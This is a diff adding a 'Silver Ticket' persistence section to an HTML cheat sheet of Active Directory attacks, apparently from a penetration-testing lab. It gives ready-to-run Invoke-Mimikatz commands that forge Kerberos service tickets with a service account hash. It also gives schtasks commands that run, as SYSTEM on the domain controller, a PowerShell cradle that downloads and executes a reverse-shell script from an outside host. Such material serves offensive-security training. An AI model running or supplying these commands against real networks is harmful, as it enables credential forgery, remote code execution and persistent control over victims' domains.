@@ -67,7 +67,30 @@
 <pre style="text-align:center;">
 <h3> PERSISTENCE - SILVER TICKET</h3>
 
+A valid TGS (Golden ticket is TGT).
+Encrypted and signed by the hash of the service account (golden ticket is signed by hash of krbtgt) of the service running with that account.
+Services rarely check PAC (Privileged Attribute Certificate). 
+Services will allow access only to the services themselves.
+Reasonable persistence period (default 30 days for computer accounts).
 
+<b>::: USING HASH OF THE DOMAIN CONTROLLER COMPUTER ACCOUNT, BELOW COMMAND PROVIDES ACCESS TO SHARES ON THE DC.</b>
+
+PS> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 
+/target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'
+
+NOTE: this same command can be applied for more services, (HTTP, HOST & more)
+
+<b>::: CREATE A SILVER TICKET FOR THE HOST SPN WHICH WILL ALLOW US TO SCHEDULE A TASK ON THE TARGET</b>
+
+PS> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 
+/target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'
+
+<b>::: SCHEDULE AND EXECUTE A TASK</b>
+
+PS> schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR
+"powershell.exe -c 'iex(New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
+
+PS> schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
 
 </center>
 </body>
